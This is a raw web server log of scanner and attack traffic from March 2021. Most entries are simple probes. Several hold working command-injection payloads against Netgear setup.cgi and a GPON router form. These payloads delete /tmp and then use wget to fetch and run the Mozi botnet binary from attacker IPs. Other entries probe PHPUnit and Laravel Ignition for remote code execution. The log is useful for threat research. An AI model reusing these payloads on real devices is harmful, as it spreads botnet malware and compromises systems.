#**# 2021-03-02 05:00:54.729 [bddca8a3601e468fab39e635ced557be]
[F] - 2021-03-02 05:00:54.727
	id: null
	info: HEAD /robots.txt 89.190.156.31 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 05:13:36.184 [3c940a51c29d4961a41a16fc22a26b51]
[F] - 2021-03-02 05:13:36.184
	id: null
	info: GET / 162.142.125.54 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
#**# 2021-03-02 05:17:18.100 [801f31a2e1c64fb9838ee5a59861c8dd]
[F] - 2021-03-02 05:17:18.100
	id: null
	info: GET /setup.cgi 178.175.52.93 
	controller:  > 
	query: {next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.52.93:37574/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
#**# 2021-03-02 05:22:35.647 [ee00e74de36c41a7825f9c34043838ab]
[F] - 2021-03-02 05:22:35.647
	id: null
	info: GET / 161.35.138.51 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 0ms
#**#
#**# 2021-03-02 05:24:22.928 [1e59e9440f41415d9892b4f23d033ab7]
[F] - 2021-03-02 05:24:22.927
	id: null
	info: GET / 161.35.134.216 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:34:57.836 [29cd392de57d4d9e8f97ffacb4a3244f]
[F] - 2021-03-02 05:34:57.835
	id: null
	info: GET /setup.cgi 178.175.3.5 
	controller:  > 
	query: {next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.3.5:34386/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:35:55.079 [25151fb0774347ae9d38cd534447a4e9]
[F] - 2021-03-02 05:35:55.078
	id: null
	info: POST /GponForm/diag_Form 178.175.99.62 
	controller:  > 
	query: {images/}
	body: XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://178.175.99.62:38464/Mozi.m+-O+->/tmp/gpon80;
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:39:18.246 [5dae60f5dbc94513b535540ca573a3a1]
[F] - 2021-03-02 05:39:18.245
	id: null
	info: GET / 209.17.96.210 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:48:13.358 [a1a9016309614046b940ffb59e73a193]
[F] - 2021-03-02 05:48:13.357
	id: null
	info: POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 45.155.205.225 
	controller:  > 
	query: {null}
	body: <?=md5("phpunit")?>
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:48:17.345 [5a4f7419ccf3479baf97419cdeffd05e]
[F] - 2021-03-02 05:48:17.344
	id: null
	info: GET / 45.155.205.225 
	controller:  > 
	query: {XDEBUG_SESSION_START=phpstorm}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:48:24.457 [6c4f29d15f744b1c9d9bae4623cd0c83]
[F] - 2021-03-02 05:48:24.456
	id: null
	info: GET /console/ 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 05:48:27.867 [3542b8b53de54bfc886b9c2ac6dd006b]
[F] - 2021-03-02 05:48:27.866
	id: null
	info: GET /_ignition/execute-solution 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
